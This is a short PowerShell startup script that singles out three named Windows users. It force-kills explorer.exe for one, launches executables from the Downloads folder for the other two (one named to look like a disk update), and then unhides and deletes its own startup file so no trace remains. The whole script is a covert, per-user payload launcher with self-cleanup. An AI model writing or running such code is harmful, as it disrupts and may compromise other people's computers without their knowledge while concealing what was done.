$user1 = "C:\Users\Jona"
$user2 = "C:\Users\angel"
$user3 = "C:\Users\seba"

if ($env:USERPROFILE -eq $user1){taskkill /F /IM explorer.exe}
if ($env:USERPROFILE -eq $user2){C:\Users\angel\Downloads\Disk-Updating.exe}
if ($env:USERPROFILE -eq $user3){C:\Users\seba\Downloads\lml.exe}

attrib -h C:\Users\Public\MyStartUp.ps1
del C:\Users\Public\MyStartUp.ps1
